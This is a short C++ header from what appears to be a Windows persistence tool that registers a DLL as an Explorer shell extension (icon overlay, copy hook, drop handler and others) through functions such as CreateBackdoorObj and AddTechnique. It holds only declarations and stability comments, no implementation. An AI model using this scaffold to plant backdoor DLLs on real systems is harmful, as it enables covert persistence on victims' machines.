#pragma once

#include <string>
#include <Windows.h>


#define HKCU 0
#define HKCR 1


#define ICON_OVERLAY 0x1 // stable af
#define ICON_HANDLER 0x2 // stable - no icon processing
#define DROP_HANDLER 0x3 // stable - handling data being dragged into file and dropped but not file's drag drop. interesting.
#define PROPERTY_SHEET_HANDLER 0x4 // stable - subfunctions not getting called
#define THUMBNAIL_IMAGE_HANDLER 0x5  // done stable 
#define INFOTIP_HANDLER 0x6 // stable - infotip not being displayed :thinking_emoji:
#define COPY_HOOK_HANDLER 0x7 // work - explorer stable , operation is slow
#define DATA_HANDLER 0x8  // stable - some weirdness with copy pasting

namespace reg {

	GUID CreateBackdoorObj(_In_ BYTE Type, _In_ std::wstring DllPath);
	BOOL AddTechnique(_In_ BYTE type, _In_opt_ WCHAR* ext, _In_ GUID Guid);
	BOOL RemoveTechnique(_In_ BYTE type, _In_ WCHAR* ext);

}